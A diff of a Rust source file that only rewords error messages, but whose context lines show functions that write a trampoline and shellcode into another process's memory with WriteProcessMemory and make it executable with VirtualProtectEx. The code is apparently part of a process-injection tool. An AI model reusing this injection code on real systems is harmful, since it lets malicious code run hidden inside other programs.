@@ -109,7 +109,7 @@ fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address:
             trampoline.len(),
             PAGE_READWRITE,
             &mut old_protect,
-        ).expect("[!] VirtualProtectEx Failed With Status");
+        ).expect("[!] VirtualProtectEx Failed With Error");
 
         WriteProcessMemory(
             h_process,
@@ -117,7 +117,7 @@ fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address:
             trampoline.as_ptr().cast(),
             trampoline.len(),
             Some(&mut number_bytes_written),
-        ).expect("[!] WriteProcessMemory Failed With Status");
+        ).expect("[!] WriteProcessMemory Failed With Error");
 
         VirtualProtectEx(
             h_process,
@@ -125,7 +125,7 @@ fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address:
             trampoline.len(),
             PAGE_EXECUTE_READWRITE,
             &mut old_protect,
-        ).expect("[!] VirtualProtectEx (2) Failed With Status");
+        ).expect("[!] VirtualProtectEx (2) Failed With Error");
     };
 }
 
@@ -138,7 +138,7 @@ fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
             PATCH_SHELLCODE.as_ptr().cast(), 
             PATCH_SHELLCODE.len(), 
             Some(&mut number_of_write)
-        ).expect("[!] WriteProcessMemory Failed With Status");
+        ).expect("[!] WriteProcessMemory Failed With Error");
         
         let shellcode_address = address as usize + PATCH_SHELLCODE.len();
         WriteProcessMemory( 
@@ -147,7 +147,7 @@ fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
             SHELLCODE.as_ptr().cast(), 
             SHELLCODE.len(), 
             Some(&mut number_of_write)
-        ).expect("[!] WriteProcessMemory (2) Failed With Status");
+        ).expect("[!] WriteProcessMemory (2) Failed With Error");
 
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtectEx(
@@ -156,7 +156,7 @@ fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
             SHELLCODE.len(), 
             PAGE_EXECUTE_READWRITE, 
             &mut old_protect
-        ).expect("[!] VirtualProtectEx (3) Failed With Status");
+        ).expect("[!] VirtualProtectEx (3) Failed With Error");
     }   
 }
 
